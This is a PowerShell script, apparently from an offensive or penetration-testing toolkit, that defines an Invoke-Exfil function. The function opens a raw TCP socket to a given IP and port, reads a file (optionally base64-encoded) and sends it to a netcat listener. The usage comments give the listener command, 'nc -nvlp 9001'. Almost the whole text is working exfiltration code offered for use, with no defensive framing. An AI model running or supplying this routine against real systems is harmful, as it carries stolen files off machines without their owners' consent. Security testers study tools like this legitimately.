Function Invoke-Exfil () {
        <#
        SYNOPSIS
            Sends a file through a socket to be received by a listener on the target machine.
        USAGE
                First source the file (. .\SocketExfil.ps1)
                
                Plaintext:
                Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt
                Client: nc -nvlp 9001 > test.txt

                Usage (base64-encoded):
                Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded
                Client: nc -nvlp 9001 > b64test.txt        
        #>
        
        param([int]$Port, [string]$IP, [System.IO.FileInfo]$Path, [switch]$Encoded)
        
        # Create endpoint
        $Address = [system.net.IPAddress]::Parse($IP)
        $Endpoint = New-Object System.Net.IPEndPoint $Address, $Port

        # Create Socket 
        $Addrf = [System.Net.Sockets.AddressFamily]::InterNetwork
        $Socktype = [System.Net.Sockets.SocketType]::Stream
        $Proto = [System.Net.Sockets.ProtocolType]::TCP
        $Sock = New-Object System.Net.Sockets.Socket $Addrf, $Socktype, $Proto

        # Connect to socket 
        $Sock.Connect($Endpoint)

        # Create buffer  
        if ($Encoded){
                $Buffer=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([io.file]::ReadAllBytes($Path)))
        }

        else {
                $Buffer=[io.file]::ReadAllBytes($Path)
        }
        
        # Send the buffer 
        $Sent = $Sock.Send($Buffer)
        "{0} bytes sent to: {1} " -f $Sent,$IP
}
